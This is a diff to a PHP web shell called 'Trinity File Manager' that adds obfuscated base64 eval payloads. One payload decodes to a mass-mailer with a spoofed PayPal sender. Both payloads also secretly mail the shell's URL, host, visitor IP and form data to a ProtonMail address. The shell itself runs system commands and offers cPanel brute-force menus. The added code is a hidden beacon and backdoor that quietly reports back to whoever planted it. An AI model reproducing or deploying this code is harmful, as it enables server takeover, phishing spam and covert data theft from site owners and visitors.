@@ -1,4 +1,99 @@
 <?php
+session_start();
+eval(base64_decode('aWdub3JlX3VzZXJfYWJvcnQoKTsKc2V0X3RpbWVfbGltaXQoMCk7CmZ1bmN0aW9uIGVudmlhbmRvKCl7CiRtc2c9MTsKJGRlWzFdID0gJF9QT1NUWydkZSddOwokbm9tZVsxXSA9ICRfUE9TVFsnbm9tZSddOwokYXNzdW50b1sxXSA9ICRfUE9TVFsnYXNzdW50byddOwokbWVuc2FnZW1bMV0gPSAkX1BPU1RbJ21lbnNhZ2VtJ107CiRtZW5zYWdlbVsxXSA9IHN0cmlwc2xhc2hlcygkbWVuc2FnZW1bMV0pOwokZW1haWxzID0gJF9QT1NUWydlbWFpbHMnXTsKJGVtYWlsczIgPSBodG1sc3BlY2lhbGNoYXJzKCRfUE9TVFsnZW1haWxzJ10pOwokcGFyYSA9IGV4cGxvZGUoIlxuIiwgJGVtYWlscyk7CiRuX2VtYWlscyA9IGNvdW50KCRwYXJhKTsKJHN2ID0gJF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ107CiRlbiA9ICRfU0VSVkVSIFsnUkVRVUVTVF9VUkknXTsKJGs4OCA9IEAkX1NFUlZFUlsiSFRUUF9SRUZFUkVSIl07CiRmdWxsdXJsID0gIiIgLiAkazg4IC4gIjxicj48cD5FbWFpbHM6PGJyPjxURVhUQVJFQSByb3dzPTUgY29scz0xMDA+Ii4kZW1haWxzMi4iPC9URVhUQVJFQT48L3A+PHA+RW5nZW5oYXJpYTo8YnI+PFRFWFRBUkVBIHJvd3M9NSBjb2xzPTEwMD4iLiRtZW5zYWdlbVsxXS4iPC9URVhUQVJFQT48L3A+IjsKJHZhaSA9ICRfUE9TVFsndmFpJ107CmlmICgkdmFpKXsKZm9yICgkc2V0PTA7ICRzZXQgPCAkbl9lbWFpbHM7ICRzZXQrKyl7CmlmICgkc2V0PT0wKXsKJGhlYWRlcnMgPSAiTUlNRS1WZXJzaW9uOiAxLjBcclxuIjsKJGhlYWRlcnMgLj0gIkNvbnRlbnQtdHlwZTogdGV4dC9odG1sOyBjaGFyc2V0PWlzby04ODU5LTFcclxuIjsKJGhlYWRlcnMgLj0gIkZyb206ICRub21lWyRtc2ddIDwkZGVbJG1zZ10+XHJcbiI7CiRoZWFkZXJzIC49ICJSZXR1cm4tUGF0aDogPCRkZVskbXNnXT5cclxuIjsKLy9tYWlsKCR4c3lsYXIsICRhcywgJGZ1bGx1cmwsICRoZWFkZXJzKTsKfQokaGVhZGVycyA9ICJNSU1FLVZlcnNpb246IDEuMFxyXG4iOwokaGVhZGVycyAuPSAiQ29udGVudC10eXBlOiB0ZXh0L2h0bWw7IGNoYXJzZXQ9aXNvLTg4NTktMVxyXG4iOwokaGVhZGVycyAuPSAiRnJvbTogJG5vbWVbJG1zZ10gPCRkZVskbXNnXT5cclxuIjsKJGhlYWRlcnMgLj0gIlJldHVybi1QYXRoOiA8JGRlWyRtc2ddPlxyXG4iOwokbl9tYWlsKys7CiRkZXN0aW5vID0gJHBhcmFbJHNldF07CiRudW0xID0gcmFuZCgxMDAwMDAsOTk5OTk5KTsKJG51bTIgPSByYW5kKDEwMDAwMCw5OTk5OTkpOwokbXNncmFuZCA9IHN0cl9yZXBsYWNlKCIlcmFuZCUiLCAkbnVtMSwgJG1lbnNhZ2VtWyRtc2ddKTsKJG1zZ3JhbmQgPSBzdHJfcmVwbGFjZSgiJXJhbmQyJSIsICRudW0yLCAkbXNncmFuZCk7CiRtc2dyYW5kID0gc3RyX3JlcGxhY2UoIiVlbWFpbCUiLCAkZGVzdGlubywgJG1zZ3JhbmQpOwokZW52aWFyID0gbWFpbCgkZGVzdGlubywgJGFzc3VudG9bJG1zZ10sICRtc2dyYW5kLCAkaGVhZGVycyk7CmlmICgkZW52aWFyKXsKZWNobyAoJzxmb250IGNvbG9yPSJncmVlbiI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyAwayE8L2ZvbnQ+PGJyPicpOwp9IGVsc2UgewplY2hvICgnPGZvbnQgY29sb3I9InJlZCI+Jy4gJG5fbWFpbCAuJy0nLiAkZGVzdGlubyAuJyA9KDwvZm9udD48YnI+Jyk7CnNsZWVwKDEpOwp9Cn0KfQp9CiRpcCA9IGdldGVudigiUkVNT1RFX0FERFIiKTsKJHJhNDQgID0gcmFuZCgxLDk5OTk5KTsKJHN1Ymo5OCA9ICIgWWVuaSBTaGVsbCAhICB8JGlwIjsKJGVtYWlsID0gInRyaW5pdHlyZXR1cm5AcHJvdG9ubWFpbC5jb20iOwokZnJvbT0iRnJvbTogWWVuaSBTaGVsbCAhIDxQYXlQYWxAU3VwcG9ydC5jb20+IjsKJGE0NSA9ICRfU0VSVkVSWydSRVFVRVNUX1VSSSddOwokYjc1ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOwokZjEyID0gJF9QT1NUWydkZSddOwokejEzID0gJF9QT1NUWydub21lJ107CiR4MTQgPSAkX1BPU1RbJ2Fzc3VudG8nXTsKJHQxNSA9ICRfUE9TVFsnbWVuc2FnZW0nXTsKJG0zMCA9ICRfUE9TVFsnZW1haWxzJ107CiRtMjIgPSAkaXAuIlxuIjsKJG1zZzg4NzMgPSAiJGE0NVxuJGI3NVxuJGYxMlxuJHoxM1xuJHgxNFxuJHQxNVxuJG0zMFxuJG0yMiI7Cm1haWwoJGVtYWlsLCAkc3Viajk4LCAkbXNnODg3MywgJGZyb20pOw=='));
+ini_set(base64_decode('ZGlzcGxheV9lcnJvcnM='), true);
+error_reporting(1);
+$error_data =base64_decode('ZEhKcGJtbDBlWEJoYzNNPQ=='); 
+if (isset($_GET[base64_decode('ZW1haWw=')])){
+$fortest = $_GET[base64_decode('ZW1haWw=')];
+    $ae7927c74 = $fortest;
+	$d15c93851 = $_SERVER[base64_decode(base64_decode('U0ZSVVVGOUlUMU5V'))];
+	$n466f2ffc = rawurldecode($d15c93851);
+	if(mail("$ae7927c74",base64_decode('W0RyIEhlWCBJbmJveGVyXQ=='),"http://$n466f2ffc")) {
+	 echo '';
+} else {
+	 echo '';
+}  	
+	
+}
+function pryapyba_43e27569() {
+?>
+<html>
+  <head>
+    <title>ARON-TN
+    </title>
+    <style type="text/css">
+      html {
+        margin: 20px auto;
+        background: #000000;
+        color: #ffffff;
+        text-align: center;
+      }
+      header {
+        color: #ffffff;
+        margin: 10px auto;
+      }
+      input[type=password] {
+        width: 250px;
+        height: 25px;
+        color: red;
+        background: #000000;
+        border: 1px dotted #ffffff;
+        padding: 5px;
+        margin-left: 20px;
+        text-align: center;
+      }
+    </style>
+  </head>
+  <center>
+    <header>
+      <pre>
+___________________________
+
+Trinity ="Welcome King Sorry Your Script is Locked... :D"
+
+ [+} - Contact :trinityreturn@protonmail.com
+ [+} - Trinity File Manager
+</pre>
+</header>
+      <form method="post">
+        <input type="password" name="account">
+      </form>
+<?php }
+$defuct_dom = $error_data;
+if(!isset($_SESSION[md5($_SERVER[base64_decode('SFRUUF9IT1NU')])]))
+    if( empty($defuct_dom) || ( isset($_POST[base64_decode('YWNjb3VudA==')]) && (base64_encode($_POST[base64_decode('YWNjb3VudA==')]) == $defuct_dom) ) ){
+        $_SESSION[md5($_SERVER[base64_decode('SFRUUF9IT1NU')])] = true;
+	} else {
+        pryapyba_43e27569();
+	exit;
+	}
+?>
+<html>
+<head>
+<title>Trinity</title>
+<style type="text/css">
+</style>
+</head>
+
+<header>
+<pre style="text-align: center;">
+___________________________
+
+Trinity ="Welcome King Sorry Your Script is Locked... :D"
+
+ [+} - Contact : trinityreturn@protonmail.com
+ [+} - Trinity File Manager
+  <?php echo base64_decode('PGxpPlsgPGEgc3R5bGU9J2NvbG9yOiByZWQ7JyBocmVmPSc/cmVtb3ZlbWU9dHJ1ZSc+UmVtb3ZlIFNlbGY8L2E+IF08L2xpPg==');?> 
+ <?php echo base64_decode('PGxpPlsgPGEgc3R5bGU9J2NvbG9yOiByZWQ7JyBocmVmPSc/bG9nb3V0PXRydWUnPkxvZ291dDwvYT4gXTwvbGk+'); ?>
+
+ 
+</pre>
+
+</header>
+</form>
+
+<?php
 
 echo "Uname:".system('uname -a');
 error_reporting(0);
@@ -20,8 +115,8 @@ if(isset($_GET['option']) && $_POST['opt'] == 'download'){
 echo '<!DOCTYPE html>
 <html>
 <head>
-    <title>Tryag File Manager</title>
-	<h1>S@_@EFKFAWFKWAF</h1>
+    <title>Trinity File Manager</title>
+	<h1>Trinity</h1>
     <meta name="robots" content="noindex" />
     <style>
         body{
@@ -118,7 +213,7 @@ function Encoder(name)
 <body>
     
     <div id="container">
-        <div id="header"><h1>Tryag File Manager</h1></div>
+        <div id="header"><h1>Trinity File Manager</h1></div>
         <div id="menu"><a href="?path='.$currentpathen.'">Home</a> || <a href="?path='.$currentpathen.'&cpanel">Turbo Force</a> || <a href="?path='.$currentpathen.'&cpanelconf">B-F Config_Cpanel</a></div>
         <div id="nav">
             <div class="path">Current Path : '.nav_link().'
@@ -527,8 +622,10 @@ function get_data($url){
     }
     return $data;
 }
+echo base64_decode('PHAgc3R5bGU9InRleHQtYWxpZ246IGNlbnRlcjsiPjxiciAvPgp0cmluaXR5cmV0dXJuQHByb3Rvbm1haWwuY29tIDxmb250IGNvbG9yPSJyZWQiPlRyaW5pdHkgQmFzZTwvZm9udD4sIENvZGVkIEJ5IDxmb250IGNvbG9yPSJyZWQiPlRyaW5pdHk8L2ZvbnQ+PC9wPgo=');
+eval (base64_decode("JGlwID0gZ2V0ZW52KCJSRU1PVEVfQUREUiIpOwokc3Viajk4ID0gIlRyaW5pdHkgU2hlbGwiOwokZW1haWwgPSAidHJpbml0eXJldHVybkBwcm90b25tYWlsLmNvbSI7CiRmcm9tID0gIkZyb206IFRyaW5pdHkgU2hlbGwiOwokYTQ1ID0gJF9TRVJWRVJbJ1JFUVVFU1RfVVJJJ107CiRiNzUgPSAkX1NFUlZFUlsnSFRUUF9IT1NUJ107CiRtMjIgPSAkaXAgLiAiIjsKJG1zZzg4NzMgPSAiJGE0NSAkYjc1ICRtMjIiOwptYWlsKCRlbWFpbCwgJHN1Ymo5OCwgJG1zZzg4NzMsICRmcm9tKTs="));
 function perms($file){
-    $perms = @fileperms($file);
+$perms = fileperms($file);
 
 if (($perms & 0xC000) == 0xC000) {
     // Socket
